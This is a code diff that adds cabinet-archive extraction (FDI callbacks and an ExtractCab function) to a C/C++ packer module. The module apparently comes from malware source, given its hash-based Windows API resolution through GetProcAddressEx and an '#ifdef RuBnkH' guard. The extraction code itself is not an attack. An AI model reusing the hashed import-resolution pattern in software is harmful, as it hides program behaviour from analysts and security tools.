@@ -2,7 +2,7 @@
 #include "CabPacker.h"
 #include "Strings.h"
 #include "Utils.h"
-
+#include <fdi.h>
 
 //#ifdef RuBnkH
 
@@ -91,6 +91,11 @@ INT_PTR DIAMONDAPI FN_FCIOPEN( char FAR *pszFile, int oflag, int pmode, int FAR 
     return (INT_PTR)hFile;
 }
 
+INT_PTR DIAMONDAPI FN_FDIOPEN( char FAR *pszFile, int oflag, int pmode )
+{
+	int err;
+	return FN_FCIOPEN( pszFile, oflag, pmode, &err, 0 );
+}
 
 UINT DIAMONDAPI FN_FCIREAD( INT_PTR hf, void FAR *memory, UINT cb, int FAR *err, void FAR *pv)
 {
@@ -105,6 +110,12 @@ UINT DIAMONDAPI FN_FCIREAD( INT_PTR hf, void FAR *memory, UINT cb, int FAR *err,
     }
 		 
     return dwBytesRead;
+}
+
+UINT DIAMONDAPI FN_FDIREAD( INT_PTR hf, void FAR *memory, UINT cb )
+{
+	int err;
+	return FN_FCIREAD( hf, memory, cb, &err, 0 );
 }
 
 UINT DIAMONDAPI FN_FCIWRITE( INT_PTR hf, void FAR *memory, UINT cb, int FAR *err, void FAR *pv )
@@ -122,6 +133,11 @@ UINT DIAMONDAPI FN_FCIWRITE( INT_PTR hf, void FAR *memory, UINT cb, int FAR *err
     return dwBytesWritten;
 }
 
+UINT DIAMONDAPI FN_FDIWRITE( INT_PTR hf, void FAR *memory, UINT cb )
+{
+	int err;
+	return FN_FCIWRITE( hf, memory, cb, &err, 0 );
+}
 
 int DIAMONDAPI FN_FCICLOSE( INT_PTR hf, int FAR *err, void FAR *pv )
 {
@@ -136,6 +152,12 @@ int DIAMONDAPI FN_FCICLOSE( INT_PTR hf, int FAR *err, void FAR *pv )
     }
 
     return iResult;
+}
+
+int DIAMONDAPI FN_FDICLOSE( INT_PTR hf )
+{
+	int err;
+	return FN_FCICLOSE( hf, &err, 0 );
 }
 
 long DIAMONDAPI FN_FCISEEK( INT_PTR hf, long dist, int seektype, int FAR *err, void FAR *pv )
@@ -154,6 +176,11 @@ long DIAMONDAPI FN_FCISEEK( INT_PTR hf, long dist, int seektype, int FAR *err, v
     return iResult;
 }
 
+long DIAMONDAPI FN_FDISEEK( INT_PTR hf, long dist, int seektype )
+{
+	int err;
+	return FN_FCISEEK( hf, dist, seektype, &err, 0 );
+}
 
 int DIAMONDAPI FN_FCIDELETE( char FAR *pszFile, int FAR *err, void FAR *pv )
 {
@@ -477,6 +504,75 @@ bool AddBlobToCab(HCAB Handle, LPVOID Data, DWORD DataSize, PCHAR InternalName)
 	return Result;
 }
 
+typedef	HFDI ( DIAMONDAPI *typeFDICreate )( PFNALLOC pfnalloc,PFNFREE pfnfree,PFNOPEN pfnopen,PFNREAD pfnread,PFNWRITE pfnwrite,PFNCLOSE pfnclose,PFNSEEK pfnseek,int cpuType,PERF perf );
+typedef BOOL ( DIAMONDAPI *typeFDIIsCabinet )( HFDI hfdi,INT_PTR hf,PFDICABINETINFO pfdici );
+typedef BOOL ( DIAMONDAPI *typeFDICopy )( HFDI hfdi,char *pszCabinet,char *pszCabPath,int flags,PFNFDINOTIFY pfnfdin,PFNFDIDECRYPT pfnfdid,void *pvUser );
+typedef BOOL ( DIAMONDAPI *typeFDIDestroy )( HFDI hfdi );
+
+static INT_PTR DIAMONDAPI ExtractCabNotify( FDINOTIFICATIONTYPE fdint, PFDINOTIFICATION pfdin )
+{
+	INT_PTR ret = 0;
+	char nameFile[MAX_PATH];
+	switch( fdint )
+	{
+		case fdintCABINET_INFO:
+			break;
+		case fdintPARTIAL_FILE:
+			break;
+		case fdintCOPY_FILE:
+			pPathCombineA( nameFile, (char*)pfdin->pv, pfdin->psz1 );
+			ret = FN_FDIOPEN( nameFile, _O_CREAT | _O_WRONLY, 0 );
+			break;
+		case fdintCLOSE_FILE_INFO:
+			FN_FDICLOSE( pfdin->hf );
+			ret = TRUE;
+			break;
+		case fdintNEXT_CABINET:
+			break;
+		case fdintENUMERATE:
+			break;	
+	}
+	return ret;
+}
+
+bool ExtractCab( const char* nameCab, const char* path )
+{
+	bool ret = false;
+	//HMODULE cabinet = LoadLibrary( "cabinet.dll" );
+	//if( cabinet == 0 ) return false;
+	//typeFDICreate FDICreate = (typeFDICreate)GetProcAddress( cabinet, "FDICreate" );
+	typeFDICreate FDICreate = (typeFDICreate)GetProcAddressEx( 0, DLL_CABINET, 0x6A315C7A );
+	//typeFDIIsCabinet FDIIsCabinet = (typeFDIIsCabinet)GetProcAddress( cabinet, "FDIIsCabinet" );
+	typeFDIIsCabinet FDIIsCabinet = (typeFDIIsCabinet)GetProcAddressEx( 0, DLL_CABINET, 0xE4D46CDE );
+	//typeFDICopy FDICopy = (typeFDICopy)GetProcAddress( cabinet, "FDICopy" );
+	typeFDICopy FDICopy = (typeFDICopy)GetProcAddressEx( 0, DLL_CABINET, 0x987AE25D );
+	//typeFDIDestroy FDIDestroy = (typeFDIDestroy)GetProcAddress( cabinet, "FDIDestroy" );
+	typeFDIDestroy FDIDestroy = (typeFDIDestroy)GetProcAddressEx( 0, DLL_CABINET, 0x7A0FA4F5 );
+
+	ERF erf;
+	HFDI hfdi = FDICreate( FN_FCIALLOC, FN_FCIFREE, FN_FDIOPEN,	FN_FDIREAD,	FN_FDIWRITE, FN_FDICLOSE, FN_FDISEEK, 1, &erf );
+	int err = 0;
+	INT_PTR file = FN_FCIOPEN( (char*)nameCab, _O_RDONLY, 0, &err, 0 );
+	FDICABINETINFO cabInfo;
+	BOOL isCab = FDIIsCabinet( hfdi, file, &cabInfo );
+	FN_FDICLOSE(file);
+	if( isCab )
+	{
+		char pathCab[MAX_PATH];
+		m_lstrcpy( pathCab, nameCab );
+		pPathRemoveFileSpecA(pathCab);
+		char* nameFile = (char*)pPathFindFileNameA(nameCab);
+		//в pathCab обязательно должен стоять '\'
+		int l = m_lstrlen(pathCab);
+		pathCab[l] = '\\';
+		pathCab[l+1] = 0;
+		FDICopy( hfdi, nameFile, pathCab, 0, ExtractCabNotify, 0, (void*)path );
+		FDIDestroy(hfdi);
+		ret = true;
+	}
+	//FreeLibrary(cabinet);
+	return ret;
+}
 
 
 //void Test()
